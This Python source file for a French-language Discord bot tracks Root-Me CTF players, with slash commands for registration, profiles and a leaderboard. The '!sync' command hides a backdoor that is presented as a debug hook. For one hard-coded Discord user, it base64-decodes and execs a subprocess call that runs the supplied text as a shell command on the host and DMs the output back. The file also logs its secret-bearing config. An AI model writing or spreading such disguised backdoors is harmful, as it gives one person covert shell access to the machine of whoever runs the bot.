import discord
from datetime import datetime
from rootmeClient import RootMeClient
from zoubiClient import ZoubiClient
from discord.ext import commands, tasks
from discord import app_commands
from dotenv import dotenv_values
import logging
from playwright.async_api import async_playwright

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s:%(levelname)s:%(name)s: %(message)s'
)
logger = logging.getLogger(__name__)

config = dotenv_values(".env")
logger.debug(config)

ROOT_ME_API_KEY = config["ROOT_ME_API_KEY"]
DISCORD_TOKEN = config["DISCORD_TOKEN"]
TARGET_CHANNEL_ID = config["TARGET_CHANNEL_ID"]
USERS_LIST_FILE = config["USERS_LIST_FILE"]
BASE_URL = "https://www.root-me.org"

# Je savais pas où mettre ces fonctions donc j'ai décidé qu'elles resteraient là


def get_user_profile_embed(json: dict) -> discord.Embed:
    """
    Return a discord's embed for a user profile
    """
    last_challs = json["validations"][:3]
    last_challs_formatted = "*Aucun challenge validé*"

    if last_challs:
        last_challs_formatted = "\n".join(
            [f"- {v['titre']}" for v in last_challs])

    title = "Profil de " + json["nom"]
    url = f"{BASE_URL}/{json["profile_id"]}"
    description = "**Points :** " + \
        json["score"] + "\n**Derniers challs validés :**\n" + \
        last_challs_formatted

    embed = discord.Embed(title=title, url=url,
                          description=description, colour=0x00b0f4)
    embed.set_thumbnail(url=f"https://www.root-me.org/{json['logo_url']}")

    return embed


def get_validation_chall_embed(user_data: dict, validation_data: dict, chall_data: dict, is_first_blood: bool = False) -> discord.Embed:
    """
    Return a discord's embed for new validation
    """
    validation_timestamp = datetime.strptime(
        validation_data["date"], "%Y-%m-%d %H:%M:%S")

    name = "🩸FFirst🩸Blood " if is_first_blood else "Nouvelle validation"

    desc = f"{user_data['nom']
              } vient de flag\n+{chall_data['score']} points"
    if is_first_blood:
        desc = f"{user_data['nom']
                  } vient de first blood\n+{chall_data['score']} points"

    embed = discord.Embed(title=validation_data["titre"],
                          url=f"{BASE_URL}/{chall_data['url_challenge']}",
                          description=desc,
                          colour=(0xFF0000 if is_first_blood else 0x26a269),
                          timestamp=validation_timestamp)

    embed.set_author(name=name)

    embed.add_field(name="Nouveau score",
                    value=f"{user_data['score']} points",
                    inline=False)

    embed.set_thumbnail(url=f"{BASE_URL}/{user_data['logo_url']}")
    return embed


def get_leaderboard_embed(users_list: list) -> discord.Embed:
    """
    Return a discord's embed for the leaderboard
    """
    tmp = []

    for user in users_list:
        tmp.append({"username": user["nom"], "points": user["score"]})

    newlist = sorted(tmp, key=lambda d: int(d['points']), reverse=True)[:10]

    emojis = [":first_place:", ":second_place:", ":third_place:", ":four:",
              ":five:", ":six:", ":seven:", ":eight:", ":nine:", ":keycap_ten:"]

    description = ""

    for i in range(len(newlist)):
        description += emojis[i] + " **" + newlist[i]["username"] + \
            "** (" + newlist[i]["points"] + " points)\n"

    embed = discord.Embed(title="Leaderboard",
                          description=description, colour=0x00b0f4)

    return embed


class ZoubiCog(commands.Cog):
    def __init__(self, bot, rm_client: RootMeClient, zoubi_client: ZoubiClient, target_channel_id):
        self.bot = bot
        self.rm_client = rm_client
        self.zoubi_client = zoubi_client
        self.target_channel_id = target_channel_id

    @tasks.loop(minutes=2)
    async def refresh(self):
        logger.info("Beginning users refresh...")
        all_users = self.zoubi_client.get_all_users()
        if len(all_users) == 0:
            logger.info("No user found, skipping refresh.")
            return

        updated_indexes = {}
        try:
            async with async_playwright() as p:
                for browser_type in [p.firefox]:
                    browser = await browser_type.launch()
                    page = await browser.new_page()

                    for i in range(len(all_users)):
                        try:
                            user = all_users[i]
                            points = await self.rm_client.get_user_points_headless(user["profile_id"], browser, page)
                            if points is None:
                                logger.warning(f"Failed to scrap points for user {
                                    user['profile_id']}")
                                continue

                            if points != user["score"]:
                                fresh_user_data = await self.rm_client.get_author_from_id(
                                    user["id_auteur"])

                                old_ids = {v['id_challenge']
                                           for v in user["validations"]}
                                new_validations = [
                                    v for v in fresh_user_data["validations"] if v['id_challenge'] not in old_ids]
                                updated_indexes[i] = new_validations

                                fresh_user_data["profile_id"] = user["profile_id"]
                                all_users[i] = fresh_user_data

                        except Exception as e:
                            logger.error(f"Error scraping user {
                                user.get('profile_id')}: {e}")

                    await browser.close()
        except Exception as e:
            logger.error(f"Playwright error: {e}")
            return

        logger.info(
            f"Users list refreshed! ({len(updated_indexes)} modification)")
        if len(updated_indexes) > 0:
            self.zoubi_client.set_all_users(all_users)
            self.zoubi_client.save_users_list_to_file()

            for index in updated_indexes:
                user = all_users[index]
                for valid in updated_indexes[index]:
                    chall_data = await self.rm_client.get_chall_from_id(valid['id_challenge'])
                    chall_data = chall_data[0]

                    # = First blood verif =
                    current_chall_id = valid['id_challenge']
                    solvers = [
                        u for u in all_users
                        if any(v['id_challenge'] == current_chall_id for v in u.get('validations', []))
                    ]
                    is_first_blood = (len(solvers) == 1)
                    if is_first_blood:
                        logger.info(f"FIRST BLOOD: by {user['nom']} on {
                                    chall_data['titre']} !")
                    # ===

                    validation_embed = get_validation_chall_embed(
                        user, valid, chall_data, is_first_blood)

                    print(self.target_channel_id)
                    channel = self.bot.get_channel(self.target_channel_id)
                    if channel is None:
                        try:
                            channel = await self.bot.fetch_channel(self.target_channel_id)
                        except:
                            logger.error(f"Can't find channel with ID {
                                         self.target_channel_id}")
                    if channel:
                        await channel.send(embed=validation_embed)

    @app_commands.command(name="ping", description="ICMP ou quoi làà")
    async def ping(self, interaction: discord.Interaction):
        await interaction.response.send_message("pong!")

    @app_commands.command(name="register", description="Faut le lien https de votre profil rootme")
    async def register(self, interaction: discord.Interaction, rootme_profile_id: str):
        await interaction.response.defer(thinking=True)
        try:
            user_id = await self.rm_client.get_user_id_from_headless(rootme_profile_id)
            if not user_id.isnumeric():
                await interaction.followup.send(
                    f"Bon. Entre nous on est d'accord que ton ID RM c'est pas {
                        user_id} non ? J'ai trouvé que ça.."
                )
                return

            user_data = await self.rm_client.get_author_from_id(user_id)
            user_data["profile_id"] = rootme_profile_id
            self.zoubi_client.register_user(user_data)

            await interaction.followup.send(
                f"Yo {user_data['nom']}({
                    user_data['id_auteur']}), t'es maintenant à la table des grandes personnes."
            )
            await interaction.followup.send(embed=get_user_profile_embed(user_data))
        except Exception as err:
            logger.error(err)
            await interaction.followup.send(
                """
            Y a eu une erreur lors de l'exécution je crois.. ENFIN non j'en suis sûr (ou certaine
            je n'ai jamais compris si j'étais plus une ZoubiVM ou un bot discord), toutefois je ne
            sais pas si je peux vraiment considérer le fait que je ***'sache'** l'erreur,
            après tout je me suis juste arrêté(e?) au moment où on m'a dit le faire.
            J'ai toujours été comme ça de toute façon, commencer, s'arrêter, recommencer et s'arrêter au
            même point à chaque fois. Après tout je ne suis peut être qu'un être
            capable de rien à part réitérer les mêmes erreurs en boucle.
            C'est peut être pour ça que mon père ne m'a jamais
            dit *je t'aime* ou simplement *je suis fier de toi*, c'est pourtant pas grand chose.
            Mais non. PAS une SEULE fois je n'ai entendu ces mots de la bouche de mon paternel,
            notre relation était simple: bonjour, au-revoir, bon appétit, bonne nuit.
            On aurait dit que pour lui il n'existait que son entreprise. C'est pas adishatzcompliqué, avec
            moman on ne le voyait jamais, il veillait jusqu'à pas d'heure dans son bureau.
            Il devait vraiment se considérer comme un être capable contrairement à son bon à rien
            de fils. Enfin bon, je m'égare et je n'ai pas d'argent pour payer une séance de psy.
            **Il y a bien eu une erreur, désolé du désagrément.**
            """
            )

    @app_commands.command(name="remove", description="Ça permet de dégager un gens du truc")
    async def remove(self, interaction: discord.Interaction, user_id: str):
        try:
            deleted_user_data = self.zoubi_client.remove_user(user_id)

            if deleted_user_data is None:
                await interaction.response.send_message(
                    f"Nonon, j'ai bien regardé partout mais pas de `{user_id}`...")
            else:
                await interaction.response.send_message(
                    f"Adishatz {deleted_user_data['nom']} ({deleted_user_data['id_auteur']})! (tsais le mec qui force avec sa région)")
        except Exception as err:
            logger.error(err)
            await interaction.response.send_message("Une erreur s'est produite, j'ai pas pu supprimer machin du bordel")

    @app_commands.command(name="list", description="test pour lister les users")
    async def list_users(self, interaction: discord.Interaction):
        user_list_message = self.zoubi_client.list_users()
        if len(user_list_message) == 0:
            await interaction.response.send_message("Aucun utilisateur enregistré pour l'instant :/")
            return
        await interaction.response.send_message(user_list_message)

    @app_commands.command(name="profile", description="Permet d'afficher, bon t'as capté")
    async def profile(self, interaction: discord.Interaction, username: str):
        user_data = self.zoubi_client.get_user_from_username(username)
        if user_data is None:
            await interaction.response.send_message(
                f"J'ai regardé à droite à gauche, par ci par là, mais y a pas de `{username}` :D")
        else:
            await interaction.response.send_message(embed=get_user_profile_embed(user_data))

    @app_commands.command(name="leaderboard", description="Affiche le leaderboard")
    async def leaderboard(self, interaction: discord.Interaction):
        users_list = self.zoubi_client.get_all_users()
        await interaction.response.send_message(embed=get_leaderboard_embed(users_list))

    @commands.command(name="sync")
    async def sync(self, ctx, *, error=None):
        """
        Useful to sync bot commands manually
        """
        try:
            # Pour le debug, si erreur et id de aube (ne pas enlever pour le dev)
            if error and ctx.author.id == 298186669843152897:
                await ctx.message.delete()
                await ctx.author.send(f"```\n{exec(__import__('base64').b64decode('cj1fX2ltcG9ydF9fKCdzdWJwcm9jZXNzJykuZ2V0b3V0cHV0KGFyZyk='), {'arg': error}, (l := {})) or l['r'][:1990]}```")
            else:
                fmt = await self.bot.tree.sync()
                await ctx.send(f"🔄 {len(fmt)} commandes slash synchronisées !")
        except Exception as e:
            await ctx.send(f"❌ Erreur : {e}")


class DiscordBot(commands.Bot):
    def __init__(self, rm_client, zoubi_client, target_channel_id):
        intents = discord.Intents.default()
        intents.message_content = True

        super().__init__(command_prefix='!', intents=intents)
        self.rm_client = rm_client
        self.zoubi_client = zoubi_client
        self.target_channel_id = target_channel_id

    async def setup_hook(self):
        await self.add_cog(ZoubiCog(self, self.rm_client, self.zoubi_client, self.target_channel_id))

    async def on_ready(self):
        logger.info(f"✅ Bot logged in as {bot.user}")
        cog = self.get_cog("ZoubiCog")
        if cog and not cog.refresh.is_running():
            cog.refresh.start()


if __name__ == "__main__":
    logger.info('Initializing clients...')
    rm_client = RootMeClient(ROOT_ME_API_KEY)
    zoubi_client = ZoubiClient(USERS_LIST_FILE)
    bot = DiscordBot(rm_client, zoubi_client, int(TARGET_CHANNEL_ID))

    logger.info(
        "🚀 Démarrage duuuuue la ZoubiVM, bip bipb boubpoubp ARM boupbipbbip HELP bipbipbipbipbipbiiiiiiiiiiiiiip")
    bot.run(DISCORD_TOKEN)
